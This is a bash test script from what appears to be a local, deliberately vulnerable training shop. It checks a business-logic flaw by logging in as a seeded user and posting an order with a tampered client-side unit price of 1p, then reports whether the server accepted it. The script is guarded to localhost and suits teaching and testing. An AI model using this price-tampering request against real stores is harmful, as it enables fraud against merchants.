#!/usr/bin/env bash
# VULN-LOGIC-01 — confirm the checkout trusts a client-supplied price.
# Places a real (test) order for 1p. Local range, seeded fake data; reset with: docker compose down -v
set -eu
cd "$(dirname "$0")/.."
. ./_lib.sh

need curl
guard_localhost
require_store

PRODUCT=2        # Debugger Duck, catalogue price 7.49
TAMPERED=0.01

echo "VULN-LOGIC-01 — will the server accept a tampered unit price (£$TAMPERED)?"
hr

token=$(login alice@duckstore.test password1)
[ -n "$token" ] || { echo "Login failed (is the range seeded?)." >&2; exit 2; }

body=$(curl -s -m 10 -X POST "$STORE/api/orders" \
    -H "Authorization: Bearer $token" -H 'Content-Type: application/json' \
    -d "{\"shippingAddress\":\"1 Test Way\",\"notes\":\"VULN-LOGIC-01 probe\",\"items\":[{\"productId\":$PRODUCT,\"quantity\":1,\"unitPrice\":$TAMPERED}]}")
total=$(printf '%s' "$body" | sed -n 's/.*"total":\([0-9.]*\).*/\1/p')
echo "Order total the server stored: £${total:-<unknown>}"

case "$total" in
    "$TAMPERED"|0.01) echo "VULNERABLE: the server trusted the client price. A £7.49 duck was bought for 1p."
                      echo "  → Flip VULN-LOGIC-01 to secure in Range Control and re-run; total becomes £7.49." ;;
    7.49|7.49000*)    echo "SECURE: the server recomputed the price from the catalogue (£7.49), ignoring the client." ;;
    *)                echo "Unexpected total ($total). Is the range running and seeded?" ;;
esac
